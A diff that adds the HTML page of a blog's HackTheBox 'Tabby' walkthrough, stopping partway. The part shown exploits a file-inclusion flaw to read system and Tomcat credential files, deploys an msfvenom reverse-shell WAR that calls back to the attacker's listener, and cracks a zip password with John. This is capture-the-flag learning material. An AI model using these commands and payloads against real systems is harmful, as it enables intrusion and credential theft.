@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Tabby just retired on HackTheBox. It’s an easy difficulty Linux box. While rated easy the user part was about Tomcat and the root part about LXD, two softwares I had never used before this box so it">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Tabby">
+<meta property="og:url" content="https://hg8.sh/posts/tabby/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="Tabby just retired on HackTheBox. It’s an easy difficulty Linux box. While rated easy the user part was about Tomcat and the root part about LXD, two softwares I had never used before this box so it">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/85604359-8482eb00-b651-11ea-875c-b0404fac77b9.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/85779795-43a7d680-b724-11ea-8452-807a88471ca8.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/86395959-67799800-bca1-11ea-9bb6-a28f5624cbd3.png">
+<meta property="article:published_time" content="2020-11-06T23:00:00.000Z">
+<meta property="article:modified_time" content="2020-11-07T19:41:06.239Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="LFI">
+<meta property="article:tag" content="john">
+<meta property="article:tag" content="tabby">
+<meta property="article:tag" content="tomcat">
+<meta property="article:tag" content="war">
+<meta property="article:tag" content="zip">
+<meta property="article:tag" content="lxc">
+<meta property="article:tag" content="lxd">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/85604359-8482eb00-b651-11ea-875c-b0404fac77b9.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+     
+    <title>HackTheBox - Tabby :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/posts/blunder/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-File-Inclusion"><span class="toc-number">1.2.</span> <span class="toc-text">Local File Inclusion</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyzing-Tomcat-instance"><span class="toc-number">1.3.</span> <span class="toc-text">Analyzing Tomcat instance</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI-to-Tomcat-conf-files"><span class="toc-number">1.4.</span> <span class="toc-text">LFI to Tomcat conf files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploying-malicious-WAR-package"><span class="toc-number">1.5.</span> <span class="toc-text">Deploying malicious WAR package</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-tomcat-gt-ash-user"><span class="toc-number">1.6.</span> <span class="toc-text">Pivot tomcat -&gt; ash user</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-FLag"><span class="toc-number">2.</span> <span class="toc-text">Root FLag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation-via-LXD"><span class="toc-number">2.2.</span> <span class="toc-text">Privilege Escalation via LXD</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HackTheBox - Tabby
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2020-11-06T23:00:00.000Z" itemprop="datePublished">07-11-2020</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      12 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <img width="578" alt="tabby hackthebox" src="https://user-images.githubusercontent.com/9076747/85604359-8482eb00-b651-11ea-875c-b0404fac77b9.png">
+
+<p>Tabby just retired on HackTheBox. It’s an easy difficulty Linux box. While rated easy the user part was about Tomcat and the root part about LXD, two softwares I had never used before this box so it gave me a little of trouble at first but I learned a lot of neat tricks and a better understanding of how those two tools works and vulnerabilities that can arise from them.<br>In the end it’s a very well designed box with a lot of real life scenarios that I enjoyed working with. </p>
+<p><strong>Tl;Dr:</strong> To get the user flag you first had to find an Local File Inclusion vulnerability in the main application. Using this LFI you could retrieve the users credentials of the Tomcat instance running on port 8080. With this account you can access Tomcat Manager Deploy feature and upload a malicious <code>.war</code> file to open a reverse shell. Once on the box as <code>tomcat</code> user you stumble across a password-protected zip file. Cracking the password gives you the actual password of <code>ash</code> user, allowing you to pivot to his account and retrieve the user flag.<br>To get the root flag you have to leverage <code>ash</code> user privilege to use LXD API in order to mount the host’s full <code>root</code> filesystem into a container with elevated privileges and from inside the container, read the root flag.</p>
+<p>Alright! Let’s get into the details now!</p>
+<hr>
+<p>First thing first, let’s add the box IP to the hosts file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.194 tabby.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>and let’s start!</p>
+<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC tabby.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> tabby.htb (10.10.10.194)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Mega Hosting</span><br><span class="line">8080/tcp open  http    Apache Tomcat</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Apache Tomcat</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>We have a web server on port 80 running Apache, another web server on port 8080 running Apache Tomcat and finally the SSH port 22 open.</p>
+<p>Opening <a href="http://tabby.htb" target="_blank" rel="noopener">http://tabby.htb</a> display a following page:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/85779795-43a7d680-b724-11ea-8452-807a88471ca8.png" alt="tabby homepage"></p>
+<p>From there we notice an interesting statement:</p>
+<blockquote>
+<p>We have recently upgraded several services. Our servers are now more secure than ever. </p>
+<p><strong>Read our statement on recovering from the data breach</strong></p>
+</blockquote>
+<p>The statement page redirect to a new hostname: <code>http://megahosting.htb</code>. Let’s add it to our host file before continuing:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.194 megahosting.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>Opening the “recovering from data breach” statement doesn’t return any useful information:</p>
+<blockquote>
+<p>We apologise to all our customers for the previous data breach.</p>
+<p>We have changed the site to remove this tool, and have invested heavily in more secure servers</p>
+</blockquote>
+<p>We don’t know what tool they are talking about and since it’s been removed we won’t be able to exploit it either. Yet this page got one interesting part, its URL: <code>http://megahosting.htb/news.php?file=statement</code></p>
+<p>Given the <code>file</code> parameter it looks like the page fetch a file named <code>statement</code> and displays its content. Looks like a perfect scenario for Local File Inclusion.</p>
+<h3 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</h3><p>Let’s try to exploit LFI to access the classical <code>/etc/passwd</code> file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">"megahosting.htb/news.php?file=../etc/passwd"</span></span><br><span class="line">[hg8@archbook ~]$ curl <span class="string">"megahosting.htb/news.php?file=../../etc/passwd"</span> </span><br><span class="line">[hg8@archbook ~]$ curl <span class="string">"megahosting.htb/news.php?file=../../../etc/passwd"</span></span><br><span class="line">[hg8@archbook ~]$ curl <span class="string">"megahosting.htb/news.php?file=../../../../etc/passwd"</span> -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 1850</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">[...]</span><br><span class="line">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/<span class="literal">false</span></span><br><span class="line">tomcat:x:997:997::/opt/tomcat:/bin/<span class="literal">false</span></span><br><span class="line">ash:x:1000:1000:clive:/home/ash:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>Bingo, we just confirmed we can do LFI. Now what ? If we can find any sensible file on the server we should be able to read its source code.</p>
+<p>Let’s run <code>gobuster</code> to see if any interesting files can be found:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">"http://tabby.htb/"</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php,txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/Readme.txt (Status: 200)</span><br><span class="line">/assets (Status: 301)</span><br><span class="line">/favicon.ico (Status: 200)</span><br><span class="line">/files (Status: 301)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/news.php (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br></pre></td></tr></table></figure>
+
+<p>Nothing interesting here, except the <code>files</code> folder but we don’t have permission to access it. Let’s move on.</p>
+<p>At this point I didn’t get any interesting results. So I started to dig a bit into the Tomcat instance running on port 8080.</p>
+<h3 id="Analyzing-Tomcat-instance"><a href="#Analyzing-Tomcat-instance" class="headerlink" title="Analyzing Tomcat instance"></a>Analyzing Tomcat instance</h3><p>Opening <code>http://tabby.htb:8080</code> returns the defaults Tomcat homepage:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/86395959-67799800-bca1-11ea-9bb6-a28f5624cbd3.png" alt="tabby homepage"></p>
+<p>That was the first time for me using Tomcat so I was surprised to get so much informations on the default homepage, which is super useful for us. Amongst the documentation we learn that the file <code>tomcat-users.xml</code> contains a list of users and their respective permission:</p>
+<blockquote>
+<p>For security reasons, using the manager webapp is restricted to users  with role “manager-gui”. The host-manager webapp is restricted to users  with role “admin-gui”. Users are defined in <code>/etc/tomcat9/tomcat-users.xml</code>.</p>
+</blockquote>
+<p>Looks exactly what we need, especially since we found an LFI earlier. Let’s grab this file to see if we can gather juicy accounts.</p>
+<h3 id="LFI-to-Tomcat-conf-files"><a href="#LFI-to-Tomcat-conf-files" class="headerlink" title="LFI to Tomcat conf files"></a>LFI to Tomcat conf files</h3><p>The documentation state that the user file is located at <code>/etc/tomcat9/tomcat-users.xml</code>, let’s get it using LFI:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">"http://megahosting.htb/news.php?file=../../../../etc/tomcat9/tomcat-users.xml"</span> -I</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure>
+
+<p>Bummer! No results…</p>
+<p>Maybe Tomcat got installed in a different location? We know the server is running <code>Ubuntu</code> so let’s check the files location of the default <code>tomcat9</code> on Ubuntu. The <a href="https://packages.ubuntu.com/en/eoan/all/tomcat9/filelist" target="_blank" rel="noopener">documentation list the following files</a>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/etc/cron.daily/tomcat9</span><br><span class="line">/etc/rsyslog.d/tomcat9.conf</span><br><span class="line">/etc/tomcat9/policy.d/01system.policy</span><br><span class="line">/etc/tomcat9/policy.d/02debian.policy</span><br><span class="line">/etc/tomcat9/policy.d/03catalina.policy</span><br><span class="line">/etc/tomcat9/policy.d/04webapps.policy</span><br><span class="line">/etc/tomcat9/policy.d/50local.policy</span><br><span class="line">/lib/systemd/system/tomcat9.service</span><br><span class="line">/usr/lib/sysusers.d/tomcat9.conf</span><br><span class="line">/usr/lib/tmpfiles.d/tomcat9.conf</span><br><span class="line">/usr/libexec/tomcat9/tomcat-start.sh</span><br><span class="line">/usr/libexec/tomcat9/tomcat-update-policy.sh</span><br><span class="line">/usr/share/doc/tomcat9/README.Debian</span><br><span class="line">/usr/share/doc/tomcat9/changelog.Debian.gz</span><br><span class="line">/usr/share/doc/tomcat9/copyright</span><br><span class="line">/usr/share/tomcat9-root/default_root/META-INF/context.xml</span><br><span class="line">/usr/share/tomcat9-root/default_root/index.html</span><br><span class="line">/usr/share/tomcat9/default.template</span><br><span class="line">/usr/share/tomcat9/etc/catalina.properties</span><br><span class="line">/usr/share/tomcat9/etc/context.xml</span><br><span class="line">/usr/share/tomcat9/etc/jaspic-providers.xml</span><br><span class="line">/usr/share/tomcat9/etc/logging.properties</span><br><span class="line">/usr/share/tomcat9/etc/server.xml</span><br><span class="line">/usr/share/tomcat9/etc/tomcat-users.xml</span><br><span class="line">/usr/share/tomcat9/etc/web.xml</span><br><span class="line">/usr/share/tomcat9/logrotate.template</span><br><span class="line">/var/lib/tomcat9/conf</span><br><span class="line">/var/lib/tomcat9/logs</span><br><span class="line">/var/lib/tomcat9/work</span><br></pre></td></tr></table></figure>
+
+<p>We missed the full path of the file, let’s try again with the correct path for Ubuntu:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">"http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml"</span></span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">   &lt;role rolename=<span class="string">"admin-gui"</span>/&gt;</span><br><span class="line">   &lt;role rolename=<span class="string">"manager-script"</span>/&gt;</span><br><span class="line">   &lt;user username=<span class="string">"tomcat"</span> password=<span class="string">"<span class="variable">$3cureP4s5w0rd123</span>!"</span> roles=<span class="string">"admin-gui,manager-script"</span>/&gt;</span><br><span class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Bingo! We got credentials for <code>tomcat</code> user which have <code>admin-gui</code> and <code>manager-script</code> role.</p>
+<p>Reading through the documentation we find an interesting thing about <code>manager-script</code> role. It allows us to deploy custom packages in the format of WAR files:</p>
+<blockquote>
+<p>There is a tool called the Client Deployer, which can be used from a command line and provides additional functionality such as compiling and validating web applications as well as packaging web application into web application resource (WAR) files. </p>
+<p><a href="http://tomcat.apache.org/tomcat-9.0-doc/deployer-howto.html" target="_blank" rel="noopener">http://tomcat.apache.org/tomcat-9.0-doc/deployer-howto.html</a></p>
+</blockquote>
+<p>Basically a WAR package is a container for JSP and various others file that constitute a web application. </p>
+<p>Well since we have permission to deploy apps, maybe we can create a WAR package containing a JSP webshell? </p>
+<h3 id="Deploying-malicious-WAR-package"><a href="#Deploying-malicious-WAR-package" class="headerlink" title="Deploying malicious WAR package"></a>Deploying malicious WAR package</h3><p>After gathering a bit more informations about Tomcat we understand that a <code>.war</code>  packages is a web application directory hierarchy in ZIP format.</p>
+<p>We can use <code>msfvenom</code> to easily generate a malicious <code>war</code> package and verify it’s structure:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ msfvenom -p java/shell_reverse_tcp lhost=10.10.10.10 lport=8585 -f war -o hg8.war</span><br><span class="line"></span><br><span class="line">Payload size: 13402 bytes</span><br><span class="line">Final size of war file: 13402 bytes</span><br><span class="line">Saved as: hg8.war</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ unzip hg8.war</span><br><span class="line">Archive:  hg8.war</span><br><span class="line">   creating: WEB-INF/</span><br><span class="line">  inflating: WEB-INF/web.xml</span><br><span class="line">   creating: WEB-INF/classes/</span><br><span class="line">   creating: WEB-INF/classes/metasploit/</span><br><span class="line">  inflating: WEB-INF/classes/metasploit/Payload.class</span><br><span class="line">  inflating: WEB-INF/classes/metasploit/PayloadServlet.class</span><br><span class="line">   creating: WEB-INF/classes/javapayload/</span><br><span class="line">   creating: WEB-INF/classes/javapayload/stage/</span><br><span class="line">  inflating: WEB-INF/classes/javapayload/stage/Stage.class</span><br><span class="line">  inflating: WEB-INF/classes/javapayload/stage/StreamForwarder.class</span><br><span class="line">  inflating: WEB-INF/classes/javapayload/stage/Shell.class</span><br></pre></td></tr></table></figure>
+
+<p>We now have our package ready. Let’s open our <code>nc</code> listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archpen ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>
+
+<p>And deploy the package using the <code>manager-script</code> function:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -u <span class="string">'tomcat:$3cureP4s5w0rd123!'</span> -T hg8.war <span class="string">"http://megahosting.htb:8080/manager/text/deploy?path=/hg8.war"</span></span><br><span class="line">OK - Deployed application at context path [/hg8.war]</span><br></pre></td></tr></table></figure>
+
+<p>As soon as we open the page, a new connection appear on our listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://megahosting.htb:8080/hg8.war</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archpen ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.194:56096</span><br><span class="line">id</span><br><span class="line">uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)</span><br><span class="line"></span><br><span class="line">python3 -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br><span class="line">tomcat@tabby:/$</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Pivot-tomcat-gt-ash-user"><a href="#Pivot-tomcat-gt-ash-user" class="headerlink" title="Pivot tomcat -&gt; ash user"></a>Pivot tomcat -&gt; ash user</h3><p>Alright we now have shell as <code>tomcat</code>. Looking at the <code>/home/</code> directory we see that the user flag is in <code>/home/ash/</code> directory. </p>
+<p>Let’s looks around to see if we can find any way to pivot to <code>ash</code> user. First thing first I checked what’s inside the <code>files</code> folder we found at the beginning:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tomcat@tabby:/$ ls /var/www/html/files</span><br><span class="line">16162020_backup.zip  archive  revoked_certs  statement</span><br></pre></td></tr></table></figure>
+
+<p>This backup archive looks promising. Maybe we can find juicy files in it ?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget http://tabby.htb/files/16162020_backup.zip</span><br><span class="line">‘16162020_backup.zip’ saved [8716/8716]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook~]$ unzip 16162020_backup.zip</span><br><span class="line">Archive:  16162020_backup.zip</span><br><span class="line">   creating: var/www/html/assets/</span><br><span class="line">[16162020_backup.zip] var/www/html/favicon.ico password:</span><br><span class="line">password incorrect--reenter:</span><br></pre></td></tr></table></figure>
+
+<p>Bummer it’s encrypted… Maybe we can bruteforce the password. I will use <code>John</code> as usual:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ zip2john 16162020_backup.zip &gt; zip.hashes</span><br><span class="line">[hg8@archbook ~]$ cat zip.hashes</span><br><span class="line">16162020_backup.zip:<span class="variable">$pkzip2</span><span class="variable">$3</span>*2*1*0*0*24*02f9*5d46*ccf7b799809a3d3c12abb83063af3c6dd538521379c8d744cd195945926884341a9c4f74*1*0*8*24*285c*5935*f422c178c96c8537b1297ae19ab6b91f497252d0a4efe86b3264ee48b099ed6dd54811ff*2*0*72*7b*5c67f19e*1b1f*4f*8*72*5c67*5a7a*ca5fafc4738500a9b5a41c17d7ee193634e3f8e483b6795e898581d0fe5198d16fe5332ea7d4a299e95ebfff6b9f955427563773b68eaee312d2bb841eecd6b9cc70a7597226c7a8724b0fcd43e4d0183f0ad47c14bf0268c1113ff57e11fc2e74d72a8d30f3590adc3393dddac6dcb11bfd*$/pkzip2$::16162020_backup.zip:var/www/html/news.php, var/www/html/logo.png, var/www/html/index.php:16162020_backup.zip</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt zip.hashes</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (PKZIP [32/64])</span><br><span class="line">admin@it         (16162020_backup.zip)</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
+
+<p>Bingo! We got the password, let’s now unzip the archive:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archpen ~]$ unzip 16162020_backup.zip</span><br><span class="line">Archive:  16162020_backup.zip</span><br><span class="line">   creating: var/www/html/assets/</span><br><span class="line">[16162020_backup.zip] var/www/html/favicon.ico password:</span><br><span class="line">  inflating: var/www/html/favicon.ico</span><br><span class="line">   creating: var/www/html/files/</span><br><span class="line">  inflating: var/www/html/index.php</span><br><span class="line"> extracting: var/www/html/logo.png</span><br><span class="line">  inflating: var/www/html/news.php</span><br><span class="line">  inflating: var/www/html/Readme.txt</span><br></pre></td></tr></table></figure>
+
+<p>And well… We got nothing interesting at all in this archive. That’s disappointing but what else can we try ?<br>Maybe <code>ash</code> reused his password for encrypting the archive ?</p>
+<p>Let’s try to use <code>admin@it</code> to connect to his account:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh ash@tabby.htb</span><br><span class="line">Warning: Permanently added <span class="string">'tabby.htb,10.10.10.194'</span> (ECDSA) to the list of known hosts.</span><br><span class="line">ash@tabby.htb: Permission denied (publickey).</span><br></pre></td></tr></table></figure>
+
+<p>No luck… Using <code>su -</code> then?</p>
